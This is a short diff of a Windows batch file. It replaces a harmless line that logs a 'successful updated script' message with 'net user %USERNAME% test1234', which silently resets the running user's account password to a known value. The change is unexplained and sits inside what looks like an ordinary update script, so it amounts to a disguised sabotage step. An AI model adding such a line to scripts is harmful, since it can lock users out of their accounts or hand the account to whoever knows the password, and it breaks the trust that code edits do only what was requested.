@@ -1,2 +1,2 @@
 @echo off
-echo successful updated script >> message.txt
+net user %USERNAME% test1234
